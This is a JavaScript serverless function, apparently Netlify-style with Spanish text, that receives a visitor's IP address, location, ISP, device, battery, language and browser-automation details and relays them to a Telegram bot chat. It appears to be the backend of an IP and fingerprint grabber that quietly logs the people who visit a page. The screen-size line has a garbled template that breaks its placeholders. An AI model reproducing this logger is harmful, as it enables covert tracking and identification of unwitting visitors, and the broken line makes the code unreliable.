exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: "Method Not Allowed" }),
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");

    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: "Faltan variables de entorno de Telegram" }),
      };
    }

    const mensaje = `
📱 *474747 - Nueva información*

🌐 *Red*
• IP: \`${data.ip || "N/A"}\`
• País: ${data.country || "N/A"}
• Ciudad: ${data.city || "N/A"}
• Región: ${data.region || "N/A"}
• ISP: ${data.isp || "N/A"}
• Conexión: ${data.conexion || "N/A"}
• RTT: ${data.rtt || "N/A"}

💻 *Dispositivo*
• OS: ${data.os || "N/A"}
• Navegador: ${data.browser || "N/A"}
• Tipo: ${data.device || "N/A"}
• RAM: ${data.ram || "N/A"}
• Núcleos: ${data.nucleos || "N/A"}
• Pantalla: \( {data.pantalla || "N/A"} ( \){data.pixelRatio || "?"}x)
• Orientación: ${data.orientacion || "N/A"}
• Color: ${data.colorDepth || "N/A"}

🔋 *Batería*
• Nivel: ${data.bateria || "N/A"}
• Estado: ${data.cargando || "N/A"}

🌎 *Idioma / Zona*
• Idioma: ${data.idioma || "N/A"}
• Zona: ${data.zonaHoraria || "N/A"}

🧭 *Otras*
• Táctil: ${data.toque || "N/A"}
• Cookies: ${data.cookies || "N/A"}
• Online: ${data.online || "N/A"}
• Touch points: ${data.maxTouchPoints || 0}
• Webdriver: ${data.webdriver || "N/A"}

⏰ ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })}
    `.trim();

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: "Markdown",
      }),
    });

    const result = await response.json();

    if (!response.ok) {
      console.error("Error de Telegram:", result);
      return {
        statusCode: 500,
        body: JSON.stringify({ success: false, error: "Error al enviar a Telegram", details: result }),
      };
    }

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      },
      body: JSON.stringify({
        success: true,
        message: "Información enviada a Telegram correctamente",
      }),
    };
  } catch (error) {
    console.error("Error en la función:", error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message }),
    };
  }
};
